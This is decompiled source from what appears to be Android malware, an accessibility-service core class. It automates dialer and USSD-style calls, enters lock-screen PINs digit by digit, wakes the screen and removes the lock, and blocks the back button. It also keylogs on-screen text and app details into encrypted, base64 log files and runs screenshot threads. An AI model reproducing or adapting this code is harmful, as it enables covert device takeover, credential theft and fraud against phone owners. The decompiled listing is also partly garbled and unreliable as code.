        v1.startActivity(10000);
        Thread.sleep(...);
        AccessibilityServiceCore.tunesxconcerningn1012ToPaste = "";
        Boolean.valueOf(1);
        AccessibilityServiceCore.tunesxconcerningn1012NeedPaste = "";
        "".tunesxconcerningn1012Treger();
        Thread.sleep(...);
        AccessibilityServiceCore.getRootInActiveWindow(...);
        "".findAccessibilityNodeInfosByViewId("com.samsung.android.dialer:id/image_view");
        v3 = AccessibilityServiceCore.getRootInActiveWindow(...);
        v3 = "com.samsung.android.dialer:id/image_view".findAccessibilityNodeInfosByViewId("com.samsung.android.dialer:id/dialButtonImage");
        v3 = 0;
        v4 = "".get(0);
        v4 = "".getParent();
        v4 = 16;
        "".performAction(16);
        Thread.sleep(...);
        "com.samsung.android.dialer:id/image_view".get(0);
        "".getParent();
        "".performAction(16);
        // goto (branch)
        // new StringBuilder("tel:")
        Uri.encode("");
        0.append("");
        0.toString();
        v0 = Uri.parse("");
        // new Intent("android.intent.action.CALL", "")
        v0 = 268435456; // 0x10000000
        "com.samsung.android.dialer:id/image_view".setFlags("");
        v1.startActivity("com.samsung.android.dialer:id/image_view");
        Thread.sleep(...);
        AccessibilityServiceCore.getRootInActiveWindow(...);
        v4 = "".findAccessibilityNodeInfosByViewId("com.android.incallui:id/icon");
        v4 = "".size();
        v4 = 2;
        if (0 != 2) { // goto +29
        v3 = 0;
        v3 = "".get(0);
        v3 = "".getParent();
        v3 = 16;
        "".performAction(16);
        v3 = 8000;
        Thread.sleep(8000, 2);
        v1.performGlobalAction(1);
        v1.startActivity("com.samsung.android.dialer:id/image_view");
        Thread.sleep(...);
        AccessibilityServiceCore.getRootInActiveWindow(...);
        v3 = "".findAccessibilityNodeInfosByViewId("com.android.incallui:id/icon");
        v3 = "".size();
        v3 = 2;
        if ("com.samsung.android.dialer:id/image_view" != 2) { // goto +1066
        v2 = "".get(1);
        v2 = "".getParent();
        v2 = 16;
        "".performAction(16);
        // goto (branch)
        "".equals("LKhu");
        if ("LKhu" == null || "LKhu" == 0) { // goto +332
        if ("" == null || "" == 0) { // goto +1037
        "".isEmpty();
        if ("" != null && "" != 0) { // goto +1029
        AccessibilityServiceCore.getApplicationContext(...);
        Boolean.valueOf(1);
        My_tunesxconcerningn10_Settings.WriteBool("", "LKhu", 2);
        "".Treger("Block");
        "".Treger("bassit");
        // new StringBuilder(16)
        "".append(16);
        "".append("*");
        "".append(16);
        "".append("*1*");
        "".append("*1*");
        "".append("*");
        "".append("*1*");
        "".toString();
        "*1*".equalsIgnoreCase("samsung");
        if ("*1*" == null || "*1*" == 0) { // goto +136
        // new StringBuilder("tel:")
        Uri.encode("");
        "LKhu".append(2);
        "LKhu".toString();
        v3 = Uri.parse("LKhu");
        // new Intent("android.intent.action.CALL", "LKhu")
        v3 = 268435456; // 0x10000000
        "*1*".setFlags("LKhu");
        v1.startActivity("*1*");
        v3 = 10000;
        Thread.sleep(10000, 2);
        v1.performGlobalAction(1);
        v4 = AccessibilityServiceCore.getPackageManager(...);
        v4 = 10000.getLaunchIntentForPackage("com.samsung.android.dialer");
        v4 = 268435456; // 0x10000000
        "*1*".setFlags(2);
        v1.startActivity(10000);
        Thread.sleep(...);
        AccessibilityServiceCore.tunesxconcerningn1012ToPaste = "";
        Boolean.valueOf(1);
        AccessibilityServiceCore.tunesxconcerningn1012NeedPaste = "";
        "".tunesxconcerningn1012Treger();
        Thread.sleep(...);
        AccessibilityServiceCore.getRootInActiveWindow(...);
        "".findAccessibilityNodeInfosByViewId("com.samsung.android.dialer:id/image_view");
        v3 = AccessibilityServiceCore.getRootInActiveWindow(...);
        v3 = "com.samsung.android.dialer:id/image_view".findAccessibilityNodeInfosByViewId("com.samsung.android.dialer:id/dialButtonImage");
        v3 = 0;
        v4 = "".get(0);
        v4 = "".getParent();
        v4 = 16;
        "".performAction(16);
        Thread.sleep(...);
        "com.samsung.android.dialer:id/image_view".get(0);
        "".getParent();
        "".performAction(16);
        // goto (branch)
        // new StringBuilder("tel:")
        Uri.encode("");
        0.append("");
        0.toString();
        v0 = Uri.parse("");
        // new Intent("android.intent.action.CALL", "")
        v0 = 268435456; // 0x10000000
        "com.samsung.android.dialer:id/image_view".setFlags("");
        v1.startActivity("com.samsung.android.dialer:id/image_view");
        Thread.sleep(...);
        AccessibilityServiceCore.getRootInActiveWindow(...);
        v4 = "".findAccessibilityNodeInfosByViewId("com.android.incallui:id/icon");
        v4 = "".size();
        v4 = 2;
        if (0 != 2) { // goto +29
        v3 = 0;
        v3 = "".get(0);
        v3 = "".getParent();
        v3 = 16;
        "".performAction(16);
        v3 = 8000;
        Thread.sleep(8000, 2);
        v1.performGlobalAction(1);
        v1.startActivity("com.samsung.android.dialer:id/image_view");
        Thread.sleep(...);
        AccessibilityServiceCore.getRootInActiveWindow(...);
        v3 = "".findAccessibilityNodeInfosByViewId("com.android.incallui:id/icon");
        v3 = "".size();
        v3 = 2;
        if ("com.samsung.android.dialer:id/image_view" != 2) { // goto +728
        v2 = "".get(1);
        v2 = "".getParent();
        v2 = 16;
        "".performAction(16);
        // goto (branch)
        "".equals("LKde");
        if ("LKde" == null || "LKde" == 0) { // goto +26
        v2 = AccessibilityServiceCore.getRootInActiveWindow(...);
        v2 = "".findAccessibilityNodeInfosByViewId("com.android.systemui:id/delete_button");
        v2 = 0;
        v2 = "".get(0);
        v2 = 16;
        "".performAction(16);
        // goto (branch)
        "".equals("LKen");
        if ("LKen" == null || "LKen" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        "".findAccessibilityNodeInfosByViewId("com.android.systemui:id/key_enter_text");
        v3 = "com.android.systemui:id/key_enter_text".isEmpty();
        if (2 != null && 2 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/key_enter_text".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        "".findAccessibilityNodeInfosByViewId("com.android.systemui:id/key_enter");
        "".get(0);
        // goto (branch)
        "".performAction("com.android.systemui:id/key_enter");
        // goto (branch)
        v2 = "".equals("LKnn");
        if ("LKnn" == null || "LKnn" == 0) { // goto +29
        v2 = 8;
        v1.performGlobalAction(8);
        v2 = 1000;
        Thread.sleep(1000, 0);
        AccessibilityServiceCore.wakeupScreen(...);
        v0 = 3;
        v1.performGlobalAction(3);
        v2 = 1000;
        Thread.sleep(1000, 0);
        ScreenLockMonitor.destoryLock(...);
        // goto (branch)
        3.equals("LK0");
        if ("LK0" == null || "LK0" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey0");
        v3 = "com.android.systemui:id/VivoPinkey0".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey0".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key0");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key0");
        // goto (branch)
        3.equals("LK1");
        if ("LK1" == null || "LK1" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey1");
        v3 = "com.android.systemui:id/VivoPinkey1".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey1".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key1");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key1");
        // goto (branch)
        3.equals("LK2");
        if ("LK2" == null || "LK2" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey2");
        v3 = "com.android.systemui:id/VivoPinkey2".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey2".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key2");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key2");
        // goto (branch)
        3.equals("LK3");
        if ("LK3" == null || "LK3" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey3");
        v3 = "com.android.systemui:id/VivoPinkey3".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey3".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key3");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key3");
        // goto (branch)
        3.equals("LK4");
        if ("LK4" == null || "LK4" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey4");
        v3 = "com.android.systemui:id/VivoPinkey4".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey4".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key4");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key4");
        // goto (branch)
        3.equals("LK5");
        if ("LK5" == null || "LK5" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey5");
        v3 = "com.android.systemui:id/VivoPinkey5".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey5".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key5");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key5");
        // goto (branch)
        3.equals("LK6");
        if ("LK6" == null || "LK6" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey6");
        v3 = "com.android.systemui:id/VivoPinkey6".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey6".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key6");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key6");
        // goto (branch)
        3.equals("LK7");
        if ("LK7" == null || "LK7" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey7");
        v3 = "com.android.systemui:id/VivoPinkey7".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey7".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key7");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key7");
        // goto (branch)
        3.equals("LK8");
        if ("LK8" == null || "LK8" == 0) { // goto +47
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey8");
        v3 = "com.android.systemui:id/VivoPinkey8".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey8".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key8");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key8");
        // goto (branch)
        3.equals("LK9");
        if ("LK9" == null || "LK9" == 0) { // goto +46
        AccessibilityServiceCore.getRootInActiveWindow(...);
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey9");
        v3 = "com.android.systemui:id/VivoPinkey9".isEmpty();
        if (0 != null && 0 != 0) { // goto +12
        v3 = 0;
        v2 = "com.android.systemui:id/VivoPinkey9".get(0);
        v2 = 16;
        // goto (branch)
        v3 = 0;
        3.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key9");
        3.get(0);
        // goto (branch)
        3.performAction("com.android.systemui:id/key9");
        // goto (branch)
        3.equals("SK");
        if (3 == null || 3 == 0) { // goto +54
        "1".equals(3);
        if (3 == null || 3 == 0) { // goto +7
        MainBackgroundService.ifScreenShot = "0";
        // goto (branch)
        MainBackgroundService.ifScreenShot = "1";
        "1".equals("0");
        if ("0" == null || "0" == 0) { // goto +18
        // new AccessibilityServiceCore$7(v1)
        // new Thread("SK")
        v1.screenShotThread = "0";
        "0".start();
        // goto (branch)
        "0".interrupt();
        v0 = 0;
        v1.screenShotThread = 0;
        return;
        0.printStackTrace();
        return;
    }

    public void tunesxconcerningn1012SendMeHome() {
        v0 = new Handler();
        v1 = Looper.getMainLooper();
        // new Handler(v1)
        v1 = new AccessibilityServiceCore$1();
        // new AccessibilityServiceCore$1(v2)
        v0.post(v1);
        return;
    }

    public boolean tunesxconcerningn1012ShowActivite(Class param0) {
        v0 = new Intent();
        // new Intent(v1, v2)
        v2 = 268435456; // 0x10000000
        v0 = v0.addFlags(v2);
        v0 = 536870912; // 0x20000000
        v2 = v2.addFlags(v0);
        v1.startActivity(v2);
        v2 = 1;
        return 1;
        v2 = 0;
        return 0;
    }

    public void tunesxconcerningn1012Treger() {
        v0 = new Handler();
        v1 = Looper.getMainLooper();
        // new Handler(v1)
        v1 = new AccessibilityServiceCore$15();
        // new AccessibilityServiceCore$15(v2)
        v0.post(v1);
        return;
    }

    public void tunesxconcerningn1012blockBack() {
        v0 = new Handler();
        v1 = Looper.getMainLooper();
        // new Handler(v1)
        v1 = new AccessibilityServiceCore$17();
        // new AccessibilityServiceCore$17(v2)
        v0.post(v1);
        return;
    }

    public void tunesxconcerningn1012click(int param0, int param1) {
        v1.getRootInActiveWindow();
        AccessibilityServiceCore.tunesxconcerningn1012clickAtPosition(v2, v3, v0);
        return;
    }

    public void tunesxconcerningn1012pasteText() {
        v1 = v4.getRootInActiveWindow();
        v1 = 1;
        v2 = v0.findFocus(1);
        if (v0 == null || v0 == 0) { // goto +41
        // new Bundle()
        v2 = "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE";
        v3 = AccessibilityServiceCore.tunesxconcerningn1012ToPaste;
        1.putString("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", v3);
        v2 = 2097152; // 0x200000
        v0 = v0.performAction("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", 1);
        if (v0 != null && v0 != 0) { // goto +10
        v0 = AccessibilityServiceCore.tunesxconcerningn1012Globalnode;
        if (v0 != null && v0 != 0) { // goto +3
        return;
        v0.performAction("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", 1);
        v0 = "";
        AccessibilityServiceCore.tunesxconcerningn1012ToPaste = "";
        v0 = 0;
        Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012NeedPaste = 0;
        return;
    }

    public void tunesxconcerningn1012sendlog(AccessibilityEvent param0, int param1) {
        v0 = "#";
        v1 = 3;
        v2 = 0;
        v3 = 0;
        v4 = 1;
        v5 = MainBackgroundService.k;
        if (v5 == null || v5 == 0) { // goto +183
        v5 = MainBackgroundService.k_tunesxconcerningn1011_live;
        if (v5 == null || v5 == 0) { // goto +179
        if (v14 == null || v14 == 0) { // goto +177
        v14.getText();
        v5.toString();
        if (v5 == null || v5 == 0) { // goto +8
        v5.length();
        if (v6 >= 1) { // goto +10
        v14.getContentDescription();
        v5.toString();
        if (v5 == null || v5 == 0) { // goto +150
        v5.length();
        if (v6 >= 1) { // goto +4
        // goto (branch)
        v6 = v14.getPackageName();
        v6 = (String) v6;
        v8 = v13.getApplicationContext();
        v8 = v7.getPackageManager();
        v8 = "null";
        v9 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v10 = v9.getPackageManager();
        v10 = v9.getApplicationIcon(v6);
        v10 = 24;
        v11 = v13.convertToBitmap(v9, 24, 24);
        // new ByteArrayOutputStream()
        v11 = Bitmap$CompressFormat.JPEG;
        v12 = 50;
        v9.compress(v11, 50, 24);
        24.toByteArray();
        Base64.encodeToString(v9, 0);
        v6 = v7.getApplicationInfo(v6, 0);
        // goto (branch)
        v6 = 0;
        if (v6 == null || v6 == 0) { // goto +7
        v6 = v7.getApplicationLabel(v6);
        // goto (branch)
        v6 = MainBackgroundService.c_tunesxconcerningn1011_mn;
        v6 = v6[3];
        v6 = (String) v6;
        v7 = new StringBuilder();
        // new StringBuilder()
        v9 = MainBackgroundService.c_tunesxconcerningn1011_mn;
        v9 = v9[1];
        v7.append(v9);
        v9 = MainBackgroundService.c_tunesxconcerningn1011_mn;
        v10 = 2;
        v9 = v9[2];
        v7.append(v9);
        v7.append(v6);
        v6 = MainBackgroundService.c_tunesxconcerningn1011_mn;
        v6 = v6[2];
        v7.append(v6);
        v7.append(v5);
        v5 = MainBackgroundService.c_tunesxconcerningn1011_mn;
        v5 = v5[2];
        v7.append(v5);
        v5 = String.valueOf(v15);
        v7.append(v5);
        v5 = "<0>";
        v7.append("<0>");
        v7.append("null");
        v6 = v7.toString();
        v6 = "	";
        "	".getBytes();
        DataEncryptionEngine.agreeltimelybfacilitatez38("<0>", "	");
        // goto (branch)
        return;
        v14.getText();
        "<0>".toString();
        if ("<0>" == null || "<0>" == 0) { // goto +8
        "<0>".length();
        if ("	" >= 1) { // goto +10
        v14.getContentDescription();
        1.toString();
        v14.getPackageName();
        v13.getApplicationContext();
        "	".getPackageManager();
        "	".getApplicationInfo(1, 0);
        if (0 == null || 0 == 0) { // goto +7
        "	".getApplicationLabel(0);
        // goto (branch)
        // new StringBuilder()
        0.append(3);
        0.append("#");
        0.append("<0>");
        0.append("#");
        String.valueOf(v15);
        0.append(v15);
        0.toString();
        v13.tunesxconcerningn1012writeFile(v15);
        v13.checkPassword(v14);
        return;
    }

     void tunesxconcerningn1012writeFile(String param0) {
        v0 = ".txt";
        v1 = "/Config/sys/apps/log";
        v2 = "log-";
        v3 = "/Config/sys/apps/log/log-";
        v4 = v9.checkIfMatch(v10);
        if (v4 == null || v4 == 0) { // goto +11
        v4 = 7;
        v5 = 11;
        v10.substring(7, 11);
        MainBackgroundService.ussdpayd = 7;
        // new Date()
        DateFormat.format("yyyy-MM-dd", 11);
        v6 = "yyyy-MM-dd".toString();
        v6 = Environment.getExternalStorageDirectory();
        v6 = new File();
        // new File(11, "/Config/sys/apps/log")
        v7 = new File();
        v8 = new StringBuilder();
        // new StringBuilder("/Config/sys/apps/log/log-")
        v8.append("yyyy-MM-dd");
        v8.append(".txt");
        v8.toString();
        // new File(11, "/Config/sys/apps/log/log-")
        v6.exists();
        if ("/Config/sys/apps/log/log-" != null && "/Config/sys/apps/log/log-" != 0) { // goto +5
        v6.mkdirs();
        v7.exists();
        if ("/Config/sys/apps/log/log-" != null && "/Config/sys/apps/log/log-" != 0) { // goto +5
        v7.createNewFile();
        // new StringBuilder()
        v10 = AccessibilityServiceCore.tunesxconcerningn1012toBase64(v10);
        "/Config/sys/apps/log/log-".append(v10);
        v10 = ">
\n";
        "/Config/sys/apps/log/log-".append(">
\n");
        v6 = "/Config/sys/apps/log/log-".toString();
        v6 = new StringBuilder();
        // new StringBuilder()
        v6.append(11);
        v6.append("/Config/sys/apps/log");
        v6.toString();
        // new StringBuilder("log-")
        11.append("yyyy-MM-dd");
        11.append(".txt");
        11.toString();
        // new File("/Config/sys/apps/log", ".txt")
        v1 = "/Config/sys/apps/log/log-".exists();
        if (".txt" != null && ".txt" != 0) { // goto +5
        "/Config/sys/apps/log/log-".createNewFile();
        v1 = 1;
        // new FileOutputStream("/Config/sys/apps/log/log-", 1)
        // new OutputStreamWriter(".txt")
        1.append(">
\n");
        1.flush();
        1.close();
        ".txt".close();
        ".txt".flush();
        return;
    }

    public void wakeupScreen() {
        v0 = "power";
        v5.getSystemService("power");
        v1 = "power".isInteractive();
        if (v1 != null && v1 != 0) { // goto +41
        v1 = "MyAccessibilityService:wakeLock";
        v2 = 805306394;
        "power".newWakeLock(805306394, "MyAccessibilityService:wakeLock");
        "power".acquire();
        // new Handler()
        // new AccessibilityServiceCore$13(v5, "power")
        v3 = 25000;
        "MyAccessibilityService:wakeLock".postDelayed(805306394, 25000, v4);
        // goto (branch)
        // new AccessibilityServiceCore$14(v5)
        v1 = 0;
        "power".execute(0);
        return;
    }
}
